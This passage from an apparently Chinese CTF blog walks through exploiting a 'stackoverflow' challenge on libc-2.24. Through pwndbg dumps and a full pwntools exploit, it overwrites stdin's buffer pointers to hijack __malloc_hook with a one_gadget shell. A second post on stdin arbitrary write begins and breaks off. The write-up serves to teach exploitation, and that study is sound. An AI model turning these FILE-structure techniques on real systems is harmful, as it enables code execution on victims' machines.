class="number">0x41ff894156415741</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fffffffde88</span> —▸ <span class="number">0x400a34</span> ◂— <span class="number">0xbfc6894890458d48</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rsi <span class="number">0x7fffffffde90</span> ◂— <span class="number">0x3131313131313131</span> (<span class="string">&#x27;11111111&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fffffffde98</span> —▸ <span class="number">0x7ffff7a8dd0a</span> (_IO_default_xsgetn+<span class="number">634</span>) ◂— <span class="number">0x554100401f0fffff</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│     <span class="number">0x7fffffffdea0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│     <span class="number">0x7fffffffdea8</span> —▸ <span class="number">0x7ffff7dd2600</span> (_IO_2_1_stdout_) ◂— <span class="number">0xfbad2887</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;leave your name, bro:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;worrier 11111111&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;,&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">515410</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br></pre></td></tr></table></figure>
<p>程序有 off-by-one ，但和传统菜单题还不一样，它没有修改模块或者释放模块，只能进行申请操作，并且申请之后的 chunk 只有一次输入机会，此后便不能控制了</p>
<p>我用已知的知识就只能走到这里了（后面的内容涉及到 stdin_任意写）</p>
<p>libc-2.24 版本有一个特点：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *<span class="built_in">stdin</span></span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  _flags = <span class="number">-72540021</span>,</span><br><span class="line">  _IO_read_ptr = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_read_end = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_read_base = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_write_end = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_buf_base = <span class="number">0x7febfb4bd943</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x7febfb4bd944</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">&quot;&quot;</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _markers = <span class="number">0x0</span>,</span><br><span class="line">  _chain = <span class="number">0x0</span>,</span><br><span class="line">  _fileno = <span class="number">0</span>,</span><br><span class="line">  _flags2 = <span class="number">16</span>,</span><br><span class="line">  _old_offset = <span class="number">-1</span>,</span><br><span class="line">  _cur_column = <span class="number">0</span>,</span><br><span class="line">  _vtable_offset = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>,</span><br><span class="line">  _shortbuf = <span class="string">&quot;\n&quot;</span>,</span><br><span class="line">  _lock = <span class="number">0x7febfb4bf770</span> &lt;_IO_stdfile_0_lock&gt;,</span><br><span class="line">  _offset = <span class="number">-1</span>,</span><br><span class="line">  _codecvt = <span class="number">0x0</span>,</span><br><span class="line">  _wide_data = <span class="number">0x7febfb4bd9a0</span> &lt;_IO_wide_data_0&gt;,</span><br><span class="line">  _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">  _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">  __pad5 = <span class="number">0</span>,</span><br><span class="line">  _mode = <span class="number">-1</span>,</span><br><span class="line">  _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7febfb4bd8c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007febfb4bd943</span></span><br><span class="line"><span class="number">0x7febfb4bd8d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007febfb4bd943</span>	<span class="number">0x00007febfb4bd943</span></span><br><span class="line"><span class="number">0x7febfb4bd8e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007febfb4bd943</span>	<span class="number">0x00007febfb4bd943</span></span><br><span class="line">    <span class="comment">/* _IO_write_base  _IO_write_ptr */</span></span><br><span class="line"><span class="number">0x7febfb4bd8f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007febfb4bd943</span>	<span class="number">0x00007febfb4bd943</span></span><br><span class="line">    <span class="comment">/* _IO_write_end  _IO_buf_base */</span></span><br><span class="line"><span class="number">0x7febfb4bd900</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007febfb4bd944</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">/* _IO_buf_end */</span></span><br><span class="line"><span class="number">0x7febfb4bd910</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p><code>stdin</code> 结构体中存储 <code>_IO_buf_end</code> 指针内存地址的末尾刚好为 <code>\x00</code> ，若利用漏洞我们将 <code>_IO_buf_base</code> 末尾写 <code>\x00</code> ，则会使得 <code>_IO_buf_base</code> 指向 <code>stdin</code> 结构体中存储 <code>_IO_buf_end</code> 指针内存地址，即可利用输入缓冲区覆盖 <code>_IO_buf_end</code> </p>
<p>接下来就是思考怎样才能把“\x00”覆盖到 “_IO_buf_base”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ff3a17db010</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ff3a17db010</span> ◂— <span class="number">0x61616161</span> <span class="comment">/* &#x27;aaaa&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7ff3a1d9d8c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007ff3a1d9d943</span></span><br><span class="line"><span class="number">0x7ff3a1d9d8d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007ff3a1d9d943</span>	<span class="number">0x00007ff3a1d9d943</span></span><br><span class="line"><span class="number">0x7ff3a1d9d8e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007ff3a1d9d943</span>	<span class="number">0x00007ff3a1d9d943</span></span><br><span class="line">    <span class="comment">/* _IO_write_base  _IO_write_ptr */</span></span><br><span class="line"><span class="number">0x7ff3a1d9d8f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007ff3a1d9d943</span>	<span class="number">0x00007ff3a1d9d943</span></span><br><span class="line">    <span class="comment">/* _IO_write_end  _IO_buf_base */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">7</span>]: <span class="number">0x7ff3a1d9d8f0</span>+<span class="number">0x8</span><span class="number">-0x7ff3a17db010</span></span><br><span class="line">Out[<span class="number">7</span>]: <span class="number">6039784</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: hex(<span class="number">6039784</span>)</span><br><span class="line">Out[<span class="number">8</span>]: <span class="string">&#x27;0x5c28e8&#x27;</span></span><br></pre></td></tr></table></figure>
<p>已知了偏移，就可以写入以下代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;please input the size to trigger stackoverflow: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x5c28e8</span>))</span><br><span class="line">add(<span class="number">0x200000</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;please input the size to trigger stackoverflow: &#x27;</span>)</span><br><span class="line">p.send(p64(malloc_hook+<span class="number">8</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7f68f09198c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f09198d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f09198e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f09198f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f0919900</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007f68f0919944</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">/* 把_IO_buf_base尾字节置空以后,其他的字段都置空了(除了_IO_buf_end) */</span></span><br><span class="line">    <span class="comment">/* 因为程序用setvbuf关闭了输入输出缓冲区,所以它们4个都是同步的(一样) */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7f68f09198c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007f68f0919901</span></span><br><span class="line"><span class="number">0x7f68f09198d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007f68f0919908</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line">    <span class="comment">/* 注意一下_IO_read_ptr改变了 */</span></span><br><span class="line"><span class="number">0x7f68f09198e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f09198f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f0919900</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007f68f0919af8</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">/* malloc_hook + 8 已经写入 */</span></span><br></pre></td></tr></table></figure>
<p>当把 <code>_IO_buf_base</code> 覆盖为 <code>_IO_buf_end</code> 后，从键盘中输入的应该存放在缓冲区的数据，就会覆盖 <code>_IO_buf_base</code> 作为新的缓冲区结束地址，在这里写入 malloc_hook + 8 后，从键盘中输入的数据就会覆盖到 malloc_hook + 8 的位置，进而劫持 malloc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	p.sendline(<span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># 可以用sendline,也可以用send</span></span><br><span class="line"></span><br><span class="line">payload = p64(malloc_hook + <span class="number">8</span>) + p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc_base + <span class="number">3946352</span>) + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(libc_base + <span class="number">3938720</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc_base + <span class="number">3924992</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">304</span></span><br><span class="line">payload += p64(libc_base + <span class="number">3923648</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(one_gadget) + p64(realloc)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
<p>刚开始我很不能理解这里循环输入“\x00”的作用</p>
<p>每从输入缓冲区读1个字节数据就将 <code>_IO_read_ptr</code> 加1，当 <code>_IO_read_ptr</code> 等于 <code>_IO_read_end</code> 的时候便会调用 <code>read</code> 读数据到 <code>_IO_buf_base</code> 地址中，而写入 malloc_hook + 8 的时候就导致了 <code>_IO_read_ptr</code> + 8 ，使得条件不成立： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7f68f09198c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007f68f0919901</span></span><br><span class="line"><span class="number">0x7f68f09198d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007f68f0919908</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line">    <span class="comment">/* 注意一下_IO_read_ptr改变了 */</span></span><br><span class="line"><span class="number">0x7f68f09198e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f09198f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007f68f0919900</span>	<span class="number">0x00007f68f0919900</span></span><br><span class="line"><span class="number">0x7f68f0919900</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007f68f0919af8</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">    <span class="comment">/* malloc_hook + 8 已经写入 */</span></span><br></pre></td></tr></table></figure>
<p>而循环输入8次“\x00”后：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg &amp; *<span class="built_in">stdin</span></span><br><span class="line"><span class="number">0x7f0af67948c0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad208b</span>	<span class="number">0x00007f0af6794900</span></span><br><span class="line"><span class="number">0x7f0af67948d0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x00007f0af6794900</span>	<span class="number">0x00007f0af6794900</span></span><br><span class="line"><span class="number">0x7f0af67948e0</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x00007f0af6794900</span>	<span class="number">0x00007f0af6794900</span></span><br><span class="line"><span class="number">0x7f0af67948f0</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x00007f0af6794900</span>	<span class="number">0x00007f0af6794900</span></span><br><span class="line"><span class="number">0x7f0af6794900</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007f0af6794af8</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f0af6794910</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>发现 <code>_IO_read_ptr</code> 减回去了，分析源码得知：执行 fread 时会重置这些指针字段为 <code>_IO_buf_base</code> ，但是它有时不仅没有重置，反而会继续增加，而有时又会进行重置，不知道原因</p>
<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./stackoverflow&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./stackoverflow&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.24.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,padding</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;please input the size to trigger stackoverflow: &#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;padding and ropchain: &#x27;</span>)</span><br><span class="line">	p.send(padding)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;leave your name, bro:&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;worrier 11111111&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;,&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">515410</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&#x27;realloc &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;please input the size to trigger stackoverflow: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x5c28e8</span>))</span><br><span class="line">add(<span class="number">0x200000</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;please input the size to trigger stackoverflow: &#x27;</span>)</span><br><span class="line">p.send(p64(malloc_hook+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">one_gadget_list=[<span class="number">0x45526</span>,<span class="number">0x4557a</span>,<span class="number">0xf0a51</span>,<span class="number">0xf18cb</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">3</span>]+libc_base</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	p.send(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">payload = p64(malloc_hook + <span class="number">8</span>) + p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">payload += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc_base + <span class="number">3946352</span>) + p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(libc_base + <span class="number">3938720</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0xFFFFFFFF</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(libc_base + <span class="number">3924992</span>)</span><br><span class="line">payload += <span class="string">&#x27;\x00&#x27;</span>*<span class="number">304</span></span><br><span class="line">payload += p64(libc_base + <span class="number">3923648</span>) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(one_gadget) + p64(realloc)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这道题算是经典的 stdin 任意写了，覆盖 _IO_buf_end 的操作很巧妙但也很巧合（仅限于libc-2.24），通过这题我算是把 stdin 任意写搞明白了，只是最后的操作真的有点迷，希望知道的大佬可以告诉我一下</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/02/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Astdin%E4%BB%BB%E6%84%8F%E5%86%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/02/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Astdin%E4%BB%BB%E6%84%8F%E5%86%99/" class="post-title-link" itemprop="url">IO_FILE源码分析：stdin任意写</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-04-02 01:49:41" itemprop="dateCreated datePublished" datetime="2022-04-02T01:49:41+08:00">2022-04-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-04-03 17:26:08" itemprop="dateModified" datetime="2022-04-03T17:26:08+08:00">2022-04-03</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>3.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="IO-FILE源码分析：stdin任意写"><a href="#IO-FILE源码分析：stdin任意写" class="headerlink" title="IO_FILE源码分析：stdin任意写"></a>IO_FILE源码分析：stdin任意写</h2><p>如果能过伪造这些缓冲区指针，在一定的条件下应该可以完成任意地址的读写</p>
<p>接下来描述这两部分的原理以及给出相应的题目实践，原理介绍部分是基于已经拥有可以伪造IO FILE结构体的缓冲区指针漏洞的基础上进行的，在后续过程假设我们目标写的地址是<code>write_start</code>，写结束地址为<code>write_end</code>，读的目标地址为<code>read_start</code>，读的结束地址为<code>read_end</code></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>字段名称</th>
<th>中文描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>_IO_buf_base</td>
<td>输入输出缓冲区基地址</td>
</tr>
<tr>
<td>_IO_buf_end</td>
<td>输入输出缓冲区结束地址</td>
</tr>
